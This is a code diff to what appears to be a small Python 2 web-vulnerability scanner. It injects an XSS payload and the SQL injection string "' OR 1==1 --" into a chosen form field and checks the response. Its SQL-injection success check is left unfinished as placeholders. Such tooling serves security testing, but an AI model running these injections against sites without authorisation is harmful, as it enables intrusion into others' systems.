@@ -20,23 +20,31 @@ class FormAttack():
 
         selected_forms = []
 
+        # Looking for forms where the targeted field exists.
         for form in forms:
             if self.fieldname in form['inputs']:
                 selected_forms.append(form)
 
+        # If more than one form is found, printing forms and asking to the user which one to use.
         if len(selected_forms) > 1:
             self.printForms(selected_forms)
             id = -1
             while id < 0 or id > len(selected_forms):
                 id = input('Plusieurs formulaires affichés ci-dessus ont été trouvés.\nMerci de spécifier celui à utiliser (rentrer un l\'ID entre 0 et ' + str(len(selected_forms) - 1) + ') ? ')
+        # If no form is found, stop the attack.
         elif len(selected_forms) == 0:
             print "Aucun formulaire contenant un champ '" + fieldname + "'. Abandon."
-            return 0
+            return None
+        # If only one form, selecting this one
         else: id = 0
 
         return selected_forms[id]
 
     def printForms(self, forms):
+        """
+            Affichage des champs principaux d'un formulaire.
+        """
+
         for i in range(len(forms)):
             print "Form ID: ", i
             print "Method: ", forms[i]['method']
@@ -46,6 +54,10 @@ class FormAttack():
             print '\n\n'
 
     def fillForm(self, form, fv={}):
+        """
+            Remplit un formulaire en fonction des paramètres/valeures spécifiés en argument du programme.
+        """
+
         data = {}
         for name in form['inputs']:
             inp = form['inputs'][name]
@@ -54,40 +66,53 @@ class FormAttack():
             if not 'name' in inp: continue
             if inp['type'] in ['reset']: continue
 
-            #
-            if 'value' in inp:
+            if name in fv:              # If value specified in program arguments (fv), use it.
+                data[name] = fv[name]
+            elif 'value' in inp:        # If a default value is presetted, keep this value
                 data[inp['name']] = inp['value']
                 continue
-
-            # A améliorer (gestion de plus de types d'inputs)
+            # Filling some specific and required input types, if not required leave it blank
             elif inp['type'] in ['text', 'password', 'url', 'search', 'textarea']:
-                if name in fv:
-                    data[name] = fv[name]
-                elif 'required' in inp and not (name in fv):
-                    data[name] = "xss testing"
+                if 'required' in inp: data[name] = "xss testing"
                 else: data[name] = ""
-
-            elif inp['type'] == 'radio':
-                data[name] = inp['value']
             else: data[name] = ""
 
+        # Inserting payload (overwritting) the target input
+        # Payload can be a SQL injection, an XSS, a CRSF
         data[self.fieldname] = self.PAYLOAD
         return data
 
     def run(self, fieldname, fieldvalue = {}):
-        self.target.GET(self.page)
+        """
+            Execute une attaque en injectant un charge (injection SQL ou autre) dans un formulaire
+            puis récupère la réponse du formulaire
+        """
+
+        # Fetching target page and verifying that it is a successful request
+        targetPage = self.target.GET(self.page)
+        if targetPage['Code'] != 200:
+            print "Impossible de récupérer la page cible - erreur", targetPage['Code']
+            return -1
+
+        # Writing the target field/input name as an object variable
         self.fieldname = fieldname
 
+        # Selecting the targeted form in the target page
         form = self.selectForms(self.target.getForms(self.page))
+        if not form: return -1   # In case no form is found, selectForm will return 0
 
+        # Filling and url enconding form data
         formdata = urllib.urlencode(self.fillForm(form, fieldvalue))
 
+        # Detecting where to send the form
         if (not 'action' in form) or form['action'] == '': form_dest = self.page
         else: form_dest = os.path.normpath(os.path.join(os.path.dirname(self.page), form['action']))
 
+        # Sending the form in a POST or a GET request
         if form['method'].lower() == 'post': out = self.target.POST(form_dest, data=formdata)
         elif form['method'].lower() == 'get': out = self.target.GET(form_dest + '?' + formdata)
 
+        # Return the POST or GET reply
         return out
 
 
@@ -98,6 +123,7 @@ class XSS(FormAttack):
 
         # Calling FormAttack run method
         out = FormAttack.run(self, fieldname, fieldvalue)
+        if out == -1: return False    # If attack is aborted for any reason, it will return -1
 
         if XSS.PAYLOAD in out['data']:
             print "Faille XSS exploitable sur " + os.path.join(self.target.host, self.page)
@@ -105,3 +131,22 @@ class XSS(FormAttack):
         else:
             print "Faille XSS non exploitable sur " + os.path.join(self.target.host, self.page)
             return False
+
+class SQLInjection(FormAttack):
+    PAYLOAD = "' OR 1==1 --"
+
+    def run(self, fieldname, fieldvalue = {}):
+
+        # Calling FormAttack run method
+        out = FormAttack.run(self, fieldname, fieldvalue)
+        if out == -1: return False    # If attack is aborted for any reason, it will return -1
+
+        ###
+        ### How to verify that a SQL injection works ??
+        ###
+        # if ??????????????:
+        #     print "Injection SQL exploitable sur " + os.path.join(self.target.host, self.page)
+        #     return True
+        # else:
+        #     print "Injection SQL non exploitable sur " + os.path.join(self.target.host, self.page)
+        #     return False
